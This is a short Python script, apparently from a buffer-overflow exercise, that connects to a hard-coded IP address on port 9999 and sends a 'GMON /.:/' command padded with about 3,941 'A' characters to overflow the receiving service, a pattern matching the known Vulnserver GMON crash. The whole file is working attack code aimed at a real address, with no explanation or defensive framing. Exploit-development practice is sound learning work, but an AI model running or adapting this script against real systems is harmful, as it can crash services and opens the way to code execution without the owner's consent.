import socket
import sys

IP = '35.182.31.212'
port = 9999

safe_size = 3580

buffer = "GMON /.:/".encode() + "A".encode() * 3941

print("Buffer Size: {}".format(sys.getsizeof(buffer)))

expl = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
expl.connect((IP, port))
print("Sending...")
expl.send(buffer)
print("Done")
expl.close()
exit(0)